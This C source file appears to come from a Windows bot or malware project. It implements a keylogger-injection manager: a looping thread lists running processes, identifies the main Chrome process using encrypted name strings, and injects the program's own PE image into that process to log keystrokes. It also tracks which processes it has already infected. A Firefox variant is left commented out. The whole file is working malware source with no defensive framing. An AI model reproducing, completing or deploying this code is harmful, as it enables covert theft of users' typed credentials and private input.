#define WIN32_LEAN_AND_MEAN

#include <windows.h>

#include <stdlib.h>

#include "bot.h"
#include "connection.h"

#include "functions_table.h"

#include "process_injections.h"

#include "global_config.h"
#include "debug.h"

#include "crypto.h"

#include "process_utils.h"


PROCESS_INJECTION_MUTEX* MANAGER_KEYLOGGER_PROCESS_INJECTION_MUTEX_LIST = NULL;

//
HANDLE t_keylogger_inject_thread = NULL;
DWORD t_keylogger_inject_thread_id = 0;

//
static void keylogger_inject(LPVOID imageBase)
{
	remove_dead_processes_from_list(&MANAGER_KEYLOGGER_PROCESS_INJECTION_MUTEX_LIST);

	//
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	//
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if (!l_EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return;
	}

	// Calculate how many process identifiers were returned.
	cProcesses = cbNeeded / sizeof(DWORD);

	//
	for (i = 0; i < cProcesses; i++)
	{
		char* process_command_line = NULL;
		process_command_line = get_process_command_line(aProcesses[i]);

		if (process_command_line == NULL) {
			DBG_MSG("keylogger_inject() - checking for process_id: %d, process_command_line: NULL, could not determine command line. Continue to next process. \n", aProcesses[i]);
			continue;
		}
		else
		{
			DBG_MSG("keylogger_inject() - checking for process_id: %d, process_command_line: %s \n", aProcesses[i], process_command_line);


			// 1. check if we're injecting into chrome 
			char* decrypted_str_1 = NULL;

			decrypt_to_string(&decrypted_str_1, CHROME_EXE_STR, CHROME_EXE_STR_LEN);

			char* is_chrome = strstr(process_command_line, decrypted_str_1);
			//char* is_chrome = strstr(process_command_line, "chrome.exe");

			free(decrypted_str_1);

			if (is_chrome != NULL) {
				char* decrypted_str_2 = NULL;

				decrypt_to_string(&decrypted_str_2, CHROME_TYPE_STR, CHROME_TYPE_STR_LEN);

				char* is_chrome_main_process = strstr(process_command_line, decrypted_str_2);

				free(decrypted_str_2);

				// ONLY inject into the parent chrome.exe process.
				if (is_chrome_main_process != NULL) {
					DBG_MSG("form_grabber_inject() - process_id: %d, process_command_line: %s is NOT CHROME MAIN process, continue to next process.\n", aProcesses[i], process_command_line);

					//
					free(process_command_line);
					continue;
				}

				//
				DBG_MSG("keylogger_inject() - process_id: %d, process_command_line: %s IS CHROME MAIN process, going to inject.\n", aProcesses[i], process_command_line);

				free(process_command_line);
				goto REAL_INJECTION_CODE;
			}


			// TODO: does inject into any firefox process safe ???, i.e. not making crash.
			/*
			// 2. check if we're injecting into firefox
			char* is_firefox = strstr(process_command_line, "firefox.exe");

			if (is_firefox != NULL) {
				char* is_firefox_main_process = strstr(process_command_line, "-contentproc");

				// ONLY inject into the parent firefox.exe process.
				if (is_firefox_main_process != NULL) {
					DBG_MSG("form_grabber_inject() - process_id: %d, process_command_line: %s is NOT FIREFOX MAIN process, continue to next process.\n", aProcesses[i], process_command_line);

					//
					free(process_command_line);
					continue;
				}

				// TODO:

				DBG_MSG("keylogger_inject() - process_id: %d, process_command_line: %s IS FIREFOX MAIN process, going to inject.\n", aProcesses[i], process_command_line);

				free(process_command_line);
				goto REAL_INJECTION_CODE;
			}
			*/

			//


		}

		// if not a process we must avoid to inject then do the injection. The code here seems to be no needed.
		DBG_MSG("keylogger_inject() - checking for process_id: %d, process_command_line: %s is WHAT WE WANT TO INJECT, SO INJECT NOW.\n", aProcesses[i], process_command_line);
		free(process_command_line);

		/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	REAL_INJECTION_CODE:
		if ((aProcesses[i] != 0) && (aProcesses[i] != l_GetCurrentProcessId()))
		{
			//
			PROCESS_INJECTION_MUTEX * pit = (PROCESS_INJECTION_MUTEX*)calloc(sizeof PROCESS_INJECTION_MUTEX, 1);

			bool init_pit = init_process_injection_mutex(aProcesses[i], pit);

			if (!init_pit) {
				DBG_MSG("keylogger_inject() - init_process_injection_mutex() failed. Continue ...\n");

				free(pit);
				continue;
			}

			struct node* found = find_node_in_list((struct node *)MANAGER_KEYLOGGER_PROCESS_INJECTION_MUTEX_LIST, (struct node)*pit);;

			if (found != NULL) 
			{
				DBG_MSG("keylogger_inject() - process id: %d IS in the list of injected processes. NOT going to inject.\n", aProcesses[i]);
				
				free(pit);
				continue;
			}
			else {
				DBG_MSG("keylogger_inject() - process id: %d is NOT in the list of injected processes. GOING to inject.\n", aProcesses[i]);
			}


			//
			DBG_MSG("keylogger_inject() - injecting into process id: %d \n", aProcesses[i]);

			int ret = manager_pe_injection(aProcesses[i], imageBase, ntHeader->OptionalHeader.SizeOfImage, INJECTION_MISSION_KEYLOGGER);

			if (ret) {
				DBG_MSG("keylogger_inject() - success-ed injecting into process id: %d, now do: adding to list of injected processes. \n", aProcesses[i]);

				push_node_to_list((struct node **)&MANAGER_KEYLOGGER_PROCESS_INJECTION_MUTEX_LIST, (struct node *)pit);
			}


		}
		/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	}
}

//
#define KEYLOGGER_INJECT_THREAD_INTERVAL 15000
static DWORD WINAPI keylogger_inject_thread(LPVOID manager_injection_entry_point_params_p)
{
	MANAGER_INJECTION_ENTRY_POINT_PARAMS* manager_injection_entry_point_params = (MANAGER_INJECTION_ENTRY_POINT_PARAMS*)manager_injection_entry_point_params_p;
	
	//
	while (1) {
		l_Sleep(KEYLOGGER_INJECT_THREAD_INTERVAL);
		DBG_MSG("keylogger_inject_thread: new iteration comes\n");

		// iterate through all processes, and inject if not yet:D
		keylogger_inject(manager_injection_entry_point_params->imageBase);

		DBG_MSG("keylogger_inject_thread() - MANAGER_KEYLOGGER_PROCESS_INJECTION_MUTEX_LIST: \n");
		print_list(MANAGER_KEYLOGGER_PROCESS_INJECTION_MUTEX_LIST);
	}


	return 0;
}

//
bool manager_init_keylogger_inject_thread(MANAGER_INJECTION_ENTRY_POINT_PARAMS* manager_injection_entry_point_params)
{
	//
	t_keylogger_inject_thread = l_CreateThread(
		NULL,
		0,
		keylogger_inject_thread,
		(LPVOID)manager_injection_entry_point_params,
		0,
		&t_keylogger_inject_thread_id
	);

	if (t_keylogger_inject_thread == NULL) {
		DBG_MSG(" manager_init_keylogger_inject_thread() - l_CreateThread() failed, error code: %d\n", l_GetLastError());


		return false;
	}

	//
	DBG_MSG("manager_init_keylogger_inject_thread() - SUCCESS.\n");

	//

	return true;
}